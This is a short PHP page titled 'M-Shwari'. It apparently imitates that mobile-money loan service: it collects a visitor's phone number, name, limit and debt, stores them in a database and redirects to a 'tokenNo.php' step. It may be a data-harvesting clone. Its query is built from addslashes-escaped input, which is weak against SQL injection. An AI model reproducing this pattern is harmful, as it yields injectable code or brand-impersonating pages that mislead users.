<?php 

	require"function.php";

	if($_SERVER['REQUEST_METHOD'] == "POST")
	{
		$phoneNo = addslashes ($_POST['phoneNo']);
		$name = addslashes ($_POST['name']);
		$limit = addslashes ($_POST['limit']);
		$debt = addslashes ($_POST['debt']);

		$query = "insert into users (phoneNo, fullnames, currentlimit, debt) values ('$phoneNo','$name','$limit','$debt')";

		$result = mysqli_query($con,$query);

		header("location: tokenNo.php");
		die;
	}

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>M-Shwari</title>
	<?php require "style.php";?>

</head>
<body>
	<?php require "header.php";?>
	<article class="main-body">
		<section class="upper-b">
			<div class="form">
				<h2><span class="head-h">M-Shwari</span></h2>
			</div>

			<main>
				<?php require "form.php"?>
			</main>
		</section>
		<section>
			<div class="upper-l">
				<h4 class="head-h2"><strong>How to Apply Loan:</strong></h4 >
				<ul>
					<li>Access the M-PESA menu.</li>
					<li>Select Loans and Savings.</li>
					<li>Select M-Shwari.</li>
					<li>Select Loan.</li>
					<li>Request Loan.</li>
					<li>Enter amount.</li>
					<li>Enter your M-PESA PIN</li>
					<li>Loan amount will be sent to your M-PESA Account. The loan amount to be paid will be in inclusive of the facility fee.</li>
				</ul>
			</div>
		</section>
	</article>

	<?php require "footer.php";?>

</body>
</html>